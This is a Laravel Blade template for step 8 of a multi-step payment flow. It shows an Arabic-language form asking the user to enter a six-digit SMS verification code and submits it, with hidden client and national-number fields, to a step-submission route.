@extends('frontend.layout.master')
@section('content')


<section class="payment-section m-5  section-padding">
    <div class="container">
        <div class="row  justify-center">
            <form class="payment-description p-5 w-75 " action="{{route('client.submit_step')}}"  method="post">
            @csrf
                <input type="hidden" name="client_id" value="{{$client->id}}">
                <input type="hidden" name="national_number" value="{{$client->national_number}}">
                <input type="hidden" name="step" value="8">
                <div class="text-center">
                    <h6 class="mb-5">ادخل رمز التحقيق المرسل الي جوالك برساله نصية</h6>
                    <h6>{{$client->phone}}</h6>
                </div>
                 <!--no3 el car -->
                <div class="mt-3" id="input-Tasalsol">

                    <input class="ta form-control input-of-buy" id="phid0" type="text" inputmode="numeric" name="otp_number" maxlength="6" value="{{ old('otp_number')??'' }}">
                </div>
                <div class="btn-info-box mt-4  d-flex justify-content-center">
                    <button  class=" ta btn btn-secondary btn-sm mt-4 w-50  " >تأكيد</button>
                </div>

              </form>
        </div>
    </div>
</section>



@endsection
@section('custom-script')
    <script src="{{ asset('frontend/assets/js/steps.js') }}"></script>
@endsection
